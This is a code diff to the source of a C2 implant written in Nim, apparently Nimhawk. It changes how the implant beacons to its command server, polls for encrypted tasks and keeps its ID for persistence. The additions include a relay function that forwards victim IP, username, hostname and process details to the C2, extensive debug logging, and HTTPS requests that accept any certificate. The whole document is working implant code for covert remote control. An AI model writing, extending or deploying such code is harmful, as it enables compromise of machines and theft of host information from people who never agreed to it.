@@ -1,14 +1,16 @@
-import base64, json, puppy
+# Use puppy for all architectures (ARM64 and Intel x64)
+import base64, json, puppy, sequtils
 from strutils import split, toLowerAscii, replace, strip, startsWith, toHex
 from unicode import toLower
 from os import parseCmdLine
+
 import ../util/[crypto, strenc]
 import ../config/configParser
 import tables, os, times, random
 
 # Forward declarations for persistence functions
 proc storeImplantID*(id: string)
-proc getStoredImplantID(): string  
+proc getStoredImplantID*(): string  
 proc removeStoredImplantID()
 
 # Debug function to analyze key decoding
@@ -23,6 +25,10 @@ proc debugKeyDecoding(keyStr: string, keyBytes: string, xorKey: int): void =
 
 # Define the object with listener properties
 const INITIAL_XOR_KEY {.intdefine.}: int = 459457925
+
+# Use puppy Response for all architectures
+type
+    Response* = puppy.Response
 
 type
     Listener* = object
@@ -44,100 +50,149 @@ type
         UNIQUE_XOR_KEY* : string
         httpAllowCommunicationKey* : string
 
-# HTTP request function
-proc doRequest(li : Listener, path : string, postKey : string = "", postValue : string = "", verb : string = "get") : Response =
+
+
+# HTTP request function using puppy for all architectures
+proc doRequest(li : Listener, path : string, postKey : string = "", postValue : string = "", verb : string = "get") : puppy.Response =
     try:
-        # Determine target: Either "TYPE://HOST:PORT" or "TYPE://HOSTNAME"
-        var target : string = toLowerAscii(li.listenerType) & "://"
-        if li.listenerHost != "":
-            target = target & li.listenerHost
-        else:
-            target = target & li.implantCallbackIp & ":" & li.listenerPort
-        target = target & path
-
-        # Get the workspace_uuid from the configuration
-        let config = parseConfig()
-        var workspace_uuid = ""
-        let workspace_key = obf("workspace_uuid")
-        
-        # Try to access the workspace_uuid value in the configuration
-        try:
-            for k, v in pairs(config):
-                if k == workspace_key:
-                    workspace_uuid = v
-                    break
-        except:
-            # If there is an error, leave workspace_uuid as an empty string
             when defined verbose:
-                echo obf("DEBUG: Error accessing workspace_uuid in config")
+                echo obf("DEBUG: doRequest() - Using puppy")
+                echo obf("DEBUG: doRequest() - listenerType: ") & li.listenerType
+                echo obf("DEBUG: doRequest() - listenerHost: ") & li.listenerHost
+                echo obf("DEBUG: doRequest() - implantCallbackIp: ") & li.implantCallbackIp
+                echo obf("DEBUG: doRequest() - listenerPort: ") & li.listenerPort
+                echo obf("DEBUG: doRequest() - path: ") & path
+            
+            # Determine target: Either "TYPE://HOST:PORT" or "TYPE://HOSTNAME"
+            var target : string = toLowerAscii(li.listenerType) & "://"
+            if li.listenerHost != "":
+                target = target & li.listenerHost
+            else:
+                target = target & li.implantCallbackIp & ":" & li.listenerPort
+            target = target & path
 
-        # GET request
-        if (postKey == "" or postValue == "" and path != li.reconnectPath):
-            var headers: seq[Header]
+            when defined verbose:
+                echo obf("DEBUG: doRequest() - target URL: ") & target
 
-            # Only send ID header once listener is registered
-            if li.id != "":
-                headers = @[
+            # Get the workspace_uuid from the configuration
+            let config = parseConfig()
+            var workspace_uuid = ""
+            let workspace_key = obf("workspace_uuid")
+            
+            try:
+                for k, v in pairs(config):
+                    if k == workspace_key:
+                        workspace_uuid = v
+                        break
+            except:
+                when defined verbose:
+                    echo obf("DEBUG: Error accessing workspace_uuid in config")
+
+            when defined verbose:
+                echo obf("DEBUG: doRequest() - workspace_uuid: ") & workspace_uuid
+
+            # GET request
+            if (postKey == "" or postValue == "" and path != li.reconnectPath):
+                when defined verbose:
+                    echo obf("DEBUG: doRequest() - Preparing GET request")
+                
+                var headers: seq[Header]
+
+                # Only send ID header once listener is registered
+                if li.id != "":
+                    headers = @[
+                            Header(key: "X-Request-ID", value: li.id),
+                            Header(key: "User-Agent", value: li.userAgent),
+                            Header(key: "Content-Type", value: "application/json"),
+                            Header(key: "X-Correlation-ID", value: li.httpAllowCommunicationKey),    
+                        ]
+                else:
+                    headers = @[
+                            Header(key: "User-Agent", value: li.userAgent),
+                            Header(key: "X-Correlation-ID", value: li.httpAllowCommunicationKey),
+                            Header(key: "Content-Type", value: "application/json")
+                        ]
+                
+                # Add workspace_uuid header if provided
+                if workspace_uuid != "":
+                    headers.add(Header(key: "X-Robots-Tag", value: workspace_uuid))
+                    
+                    when defined verbose:
+                        echo obf("DEBUG: Added workspace_uuid to header: ") & workspace_uuid
+
+                let parsedUrl = parseUrl(target)
+                let req = Request(
+                    url: parsedUrl,
+                    verb: verb,
+                    headers: headers,
+                    allowAnyHttpsCertificate: true,
+                    )
+
+                when defined verbose:
+                    echo obf("DEBUG: doRequest() - About to fetch()")
+                    echo obf("DEBUG: doRequest() - Request details:")
+                    echo obf("  URL: ") & $req.url
+                    echo obf("  Verb: ") & req.verb
+                    echo obf("  Headers count: ") & $req.headers.len
+
+                let fetchResult = fetch(req)
+                
+                when defined verbose:
+                    echo obf("DEBUG: doRequest() - fetch() completed successfully")
+                    echo obf("DEBUG: doRequest() - Response code: ") & $fetchResult.code
+                    
+                return fetchResult
+
+            # POST request
+            else:
+                when defined verbose:
+                    echo obf("DEBUG: doRequest() - Preparing POST request")
+                
+                var post_body = "{\"" & postKey & "\":\"" & postValue & "\"}"
+                if verb == "options":
+                    post_body = ""
+                
+                var headers = @[
                         Header(key: "X-Request-ID", value: li.id),
                         Header(key: "User-Agent", value: li.userAgent),
                         Header(key: "Content-Type", value: "application/json"),
-                        Header(key: "X-Correlation-ID", value: li.httpAllowCommunicationKey),    
+                        Header(key: "X-Correlation-ID", value: li.httpAllowCommunicationKey)
                     ]
-            else:
-                headers = @[
-                        Header(key: "User-Agent", value: li.userAgent),
-                        Header(key: "X-Correlation-ID", value: li.httpAllowCommunicationKey),
-                        Header(key: "Content-Type", value: "application/json")
-                    ]
-            
-            # Add workspace_uuid header if provided
-            if workspace_uuid != "":
-                headers.add(Header(key: "X-Robots-Tag", value: workspace_uuid))
+                
+                # Add workspace_uuid header if provided
+                if workspace_uuid != "":
+                    headers.add(Header(key: "X-Robots-Tag", value: workspace_uuid))
+                    
+                    when defined verbose:
+                        echo obf("DEBUG: Added workspace_uuid to header: ") & workspace_uuid
+                
+                let parsedUrl = parseUrl(target)
+                let req = Request(
+                    url: parsedUrl,
+                    verb: verb,
+                    headers: headers,
+                    allowAnyHttpsCertificate: true,
+                    body: post_body
+                    )
                 
                 when defined verbose:
-                    echo obf("DEBUG: Added workspace_uuid to header: ") & workspace_uuid
+                    echo obf("DEBUG: doRequest() - About to fetch() for POST")
 
-            let req = Request(
-                url: parseUrl(target),
-                verb: verb,
-                headers: headers,
-                allowAnyHttpsCertificate: true,
-                )
-
-            return fetch(req)
-
-        # POST request
-        else:
-            var post_body = "{\"" & postKey & "\":\"" & postValue & "\"}"
-            if verb == "options":
-                post_body = ""
-            
-            var headers = @[
-                    Header(key: "X-Request-ID", value: li.id),
-                    Header(key: "User-Agent", value: li.userAgent),
-                    Header(key: "Content-Type", value: "application/json"),
-                    Header(key: "X-Correlation-ID", value: li.httpAllowCommunicationKey)
-                ]
-            
-            # Add workspace_uuid header if provided
-            if workspace_uuid != "":
-                headers.add(Header(key: "X-Robots-Tag", value: workspace_uuid))
+                let fetchResult = fetch(req)
                 
                 when defined verbose:
-                    echo obf("DEBUG: Added workspace_uuid to header: ") & workspace_uuid
-                
-            let req = Request(
-                url: parseUrl(target),
-                verb: verb,
-                headers: headers,
-                allowAnyHttpsCertificate: true,
-                body: post_body
-                )
-            return fetch(req)
+                    echo obf("DEBUG: doRequest() - POST fetch() completed successfully")
+                    echo obf("DEBUG: doRequest() - Response code: ") & $fetchResult.code
+                    
+                return fetchResult
 
-    except:
-        # Return a fictive error response to handle
-        var errResponse = Response()
+    except Exception as e:
+        when defined verbose:
+            echo obf("DEBUG: doRequest() - Exception caught: ") & e.msg
+            echo obf("DEBUG: doRequest() - Exception type: ") & $e.name
+        
+        # Return error response (puppy only, no fallback)
+        var errResponse = puppy.Response()
         errResponse.code = 500
         return errResponse
 
@@ -248,6 +303,89 @@ proc postRegisterRequest*(li : var Listener, ipAddrInt : string, username : stri
         when defined verbose:
             echo obf("DEBUG: Registration successful. Implant now registered with ID: ") & li.id
 
+# Relay forwarding registration function - returns assigned ID and encryption key
+proc postRelayRegisterRequest*(li : var Listener, relayClientID: string, ipAddrInt : string, username : string, hostname : string, osBuild : string, pid : int, pname : string, riskyMode : bool) : (string, string) =
+    # Forward registration for relay client using the relay client's ID
+    when defined verbose:
+        echo obf("DEBUG: Forwarding relay registration with relay client ID: ") & relayClientID
+    
+    var data = %*
+        [
+            {
+                "i": ipAddrInt,
+                "u": username,
+                "h": hostname,
+                "o": osBuild,
+                "p": pid,
+                "P": pname,
+                "r": riskyMode
+            }
+        ]
+    var dataStr = ($data)[1..^2]
+    
+    when defined verbose:
+        echo obf("DEBUG: Relay forwarding data (unencrypted): ") & dataStr
+    
+    # Create a temporary listener with the relay client's ID for this request
+    var tempListener = li
+    tempListener.id = relayClientID
+    
+    # First, we need to initialize the relay client in the C2 (GET request)
+    when defined verbose:
+        echo obf("DEBUG: Initializing relay client in C2: ") & relayClientID
+    
+    var initRes = doRequest(tempListener, li.registerPath)
+    
+    when defined verbose:
+        echo obf("DEBUG: Relay client init response code: ") & $initRes.code
+        if initRes.code != 200:
+            echo obf("DEBUG: Relay client init response body: ") & initRes.body
+    
+    if initRes.code == 200:
+        # Parse the response to get the encryption key for this relay client
+        let responseJson = parseJson(initRes.body)
+        let clientId = responseJson["id"].getStr()
+        let keyStr = responseJson["k"].getStr()
+        
+        when defined verbose:
+            echo obf("DEBUG: Relay client got ID from C2: ") & clientId
+            echo obf("DEBUG: Relay client got key from C2 (length: ") & $keyStr.len & ")"
+        
+        # Decode and XOR the key
+        let keyBytesRaw = base64.decode(keyStr)
+        let keyByteSeq = convertToByteSeq(keyBytesRaw)
+        let clientKey = xorBytes(keyByteSeq, INITIAL_XOR_KEY)
+        
+        # Now encrypt the registration data with the relay client's key
+        let encryptedData = encryptData(dataStr, clientKey)
+        
+        when defined verbose:
+            echo obf("DEBUG: Relay client data encrypted with client key")
+        
+        # Send the POST registration with the relay client's ID and key
+        tempListener.id = clientId
+        let res = doRequest(tempListener, li.registerPath, "data", encryptedData, "post")
+        
+        when defined verbose:
+            echo obf("DEBUG: Relay forwarding response code: ") & $res.code
+            echo obf("DEBUG: Relay forwarding response body: ") & 
+                 (if res.body.len > 0: res.body else: "<empty>")
+        
+        if res.code == 200:
+            when defined verbose:
+                echo obf("DEBUG: Relay client registration forwarded successfully with ID: ") & clientId
+                echo obf("DEBUG: ✅ RELAY CLIENT REGISTERED IN C2 WITH FINAL ID: ") & clientId
+                echo obf("DEBUG: Original relay client ID: ") & relayClientID & obf(" -> C2 assigned ID: ") & clientId
+            return (clientId, clientKey)  # Return the assigned ID and encryption key
+        else:
+            when defined verbose:
+                echo obf("DEBUG: ERROR - Relay client registration failed")
+            return ("", "")  # Return empty strings on failure
+    else:
+        when defined verbose:
+            echo obf("DEBUG: ERROR - Failed to initialize relay client in C2")
+        return ("", "")  # Return empty strings on failure
+
 type
   Command = object
     guid: string
@@ -256,11 +394,23 @@ type
 
 # Watch for queued commands via GET request to the task path
 proc getQueuedCommand*(li : Listener) : (string, string, seq[string]) =
+    when defined verbose:
+        echo obf("DEBUG: getQueuedCommand() called for implant ID: ") & li.id
+        echo obf("DEBUG: getQueuedCommand() request target: ") & li.taskPath
+        echo obf("DEBUG: getQueuedCommand() full URL will be: ") & toLowerAscii(li.listenerType) & "://" & 
+             (if li.listenerHost != "": li.listenerHost else: li.implantCallbackIp & ":" & li.listenerPort) & 
+             li.taskPath
+    
     var 
         res = doRequest(li, li.taskPath)
         cmdGuid : string
         cmd : string
         args : seq[string]
+
+    when defined verbose:
+        echo obf("DEBUG: getQueuedCommand() response code: ") & $res.code
+        echo obf("DEBUG: getQueuedCommand() response body: ") & 
+             (if res.body.len > 200: res.body[0..199] & "..." else: res.body)
 
     # A connection error occurred, likely team server has gone down or restart
     if res.code != 200:
@@ -272,20 +422,61 @@ proc getQueuedCommand*(li : Listener) : (string, string, seq[string]) =
     # Otherwise, parse task and arguments (if any)
     else:
         try:
-            # Attempt to parse task (parseJson() needs string literal... sigh)
-            var responseData = decryptData(parseJson(res.body)["t"].getStr(), li.UNIQUE_XOR_KEY) #.replace("\'", "\\\"")
-            var parsedResponseData = parseJson(responseData)
-            var jsonData = to(parsedResponseData, Command)
+            when defined verbose:
+                echo obf("DEBUG: getQueuedCommand() attempting to parse response...")
+                echo obf("DEBUG: getQueuedCommand() response body for parsing: ") & res.body
+            
+            # Parse the response JSON first to see what keys are available
+            let responseJson = parseJson(res.body)
+            
+            when defined verbose:
+                echo obf("DEBUG: getQueuedCommand() parsed JSON keys: ") & $responseJson.keys().toSeq()
+            
+            # Check if the response has the expected "t" key for encrypted task data
+            if responseJson.hasKey("t"):
+                # Attempt to parse task (parseJson() needs string literal... sigh)
+                var responseData = decryptData(responseJson["t"].getStr(), li.UNIQUE_XOR_KEY) #.replace("\'", "\\\"")
+                
+                when defined verbose:
+                    echo obf("DEBUG: getQueuedCommand() decrypted response data: ") & responseData
+                
+                var parsedResponseData = parseJson(responseData)
+                
+                when defined verbose:
+                    echo obf("DEBUG: getQueuedCommand() parsed JSON: ") & $parsedResponseData
+                
+                var jsonData = to(parsedResponseData, Command)
 
-
-            # Get the task and task GUID from the response
-            cmdGuid = jsonData.guid
-            cmd = jsonData.command
-            args = jsonData.args
-        except:
+                # Get the task and task GUID from the response
+                cmdGuid = jsonData.guid
+                cmd = jsonData.command
+                args = jsonData.args
+                
+                when defined verbose:
+                    echo obf("DEBUG: getQueuedCommand() extracted - GUID: ") & cmdGuid
+                    echo obf("DEBUG: getQueuedCommand() extracted - Command: ") & cmd
+                    echo obf("DEBUG: getQueuedCommand() extracted - Args: ") & $args
+            else:
+                # No "t" key found - likely no commands available
+                when defined verbose:
+                    echo obf("DEBUG: getQueuedCommand() no 't' key found - no commands available")
+                    echo obf("DEBUG: getQueuedCommand() response JSON: ") & $responseJson
+                
+                cmdGuid = ""
+                cmd = ""
+                args = @[]
+        except Exception as e:
             # No task has been returned
+            when defined verbose:
+                echo obf("DEBUG: getQueuedCommand() no task returned or parse error: ") & e.msg
+            
             cmdGuid = ""
             cmd = ""
+
+    when defined verbose:
+        echo obf("DEBUG: getQueuedCommand() final result - GUID: ") & cmdGuid
+        echo obf("DEBUG: getQueuedCommand() final result - Command: ") & cmd
+        echo obf("DEBUG: getQueuedCommand() final result - Args: ") & $args
 
     result = (cmdGuid, cmd, args)
 
@@ -436,20 +627,25 @@ proc validateNimhawkPattern(line: string): bool =
 
 proc generateNimhawkPattern(): string =
     var pattern = ""
+    # Generate 4 digits (0-9)
     for i in 0..3:
         pattern.add(char(ord('0') + rand(10)))
     pattern.add("-")
+    # Generate 4 lowercase letters (a-z)
     for i in 0..3:
-        pattern.add(char(ord('a') + rand(26)))
+        pattern.add(char(ord('a') + rand(25)))
     pattern.add("-")
+    # Generate 5 lowercase letters (a-z)
     for i in 0..4:
-        pattern.add(char(ord('a') + rand(26)))
+        pattern.add(char(ord('a') + rand(25)))
     pattern.add("-")
+    # Generate 4 digits (0-9)
     for i in 0..3:
         pattern.add(char(ord('0') + rand(10)))
     pattern.add("-")
+    # Generate 7 uppercase letters (A-Z)
     for i in 0..6:
-        pattern.add(char(ord('A') + rand(26)))
+        pattern.add(char(ord('A') + rand(25)))
     return pattern
 
 proc getTempDir(): string =
@@ -511,7 +707,7 @@ proc storeImplantID*(id: string) =
     except:
         discard
 
-proc getStoredImplantID(): string =
+proc getStoredImplantID*(): string =
     try:
         let persistPath = findNimhawkFile()
         if persistPath == "":
